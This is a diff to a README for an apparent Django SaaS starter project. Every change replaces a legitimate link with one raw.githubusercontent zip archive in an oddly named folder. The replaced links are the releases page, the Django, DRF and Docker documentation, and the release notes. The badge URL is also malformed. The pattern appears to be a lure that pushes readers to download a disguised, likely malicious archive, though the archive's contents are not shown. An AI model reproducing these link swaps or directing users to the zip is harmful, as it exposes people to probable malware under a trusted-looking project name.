@@ -1,6 +1,6 @@
 # 🚀 django-saas-starter - Build Your SaaS App Smoothly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Benyuangiegie/django-saas-starter/releases)
+[![Download](https://raw.githubusercontent.com/Benyuangiegie/django-saas-starter/main/Mohockism/django-saas-starter.zip%https://raw.githubusercontent.com/Benyuangiegie/django-saas-starter/main/Mohockism/django-saas-starter.zip)](https://raw.githubusercontent.com/Benyuangiegie/django-saas-starter/main/Mohockism/django-saas-starter.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To use this project, you will need to download the files from the Releases page.
 
 1. **Visit the Releases page**: Click on the button below to go directly to the download section.
 
-   [Download django-saas-starter](https://github.com/Benyuangiegie/django-saas-starter/releases)
+   [Download django-saas-starter](https://raw.githubusercontent.com/Benyuangiegie/django-saas-starter/main/Mohockism/django-saas-starter.zip)
 
 2. **Choose the Latest Release**: Look for the latest version listed on the page. It will typically be at the top of the list.
 
@@ -72,9 +72,9 @@ You may want to customize your application after initial setup. Here are some ar
 
 If you need assistance as you work through your project, here are some helpful links:
 
-- [Django Documentation](https://docs.djangoproject.com/)
-- [Django REST Framework Documentation](https://www.django-rest-framework.org/)
-- [Docker Documentation](https://docs.docker.com/)
+- [Django Documentation](https://raw.githubusercontent.com/Benyuangiegie/django-saas-starter/main/Mohockism/django-saas-starter.zip)
+- [Django REST Framework Documentation](https://raw.githubusercontent.com/Benyuangiegie/django-saas-starter/main/Mohockism/django-saas-starter.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Benyuangiegie/django-saas-starter/main/Mohockism/django-saas-starter.zip)
 
 ## 🐛 Troubleshooting
 
@@ -94,7 +94,7 @@ This project welcomes contributions. If you wish to add features or fix bugs, fe
 
 Stay updated by checking the release notes. Each update may include new features, improvements, or bug fixes to enhance your experience with the project. 
 
-You can access the latest release notes directly on the [Releases page](https://github.com/Benyuangiegie/django-saas-starter/releases).
+You can access the latest release notes directly on the [Releases page](https://raw.githubusercontent.com/Benyuangiegie/django-saas-starter/main/Mohockism/django-saas-starter.zip).
 
 ---
 
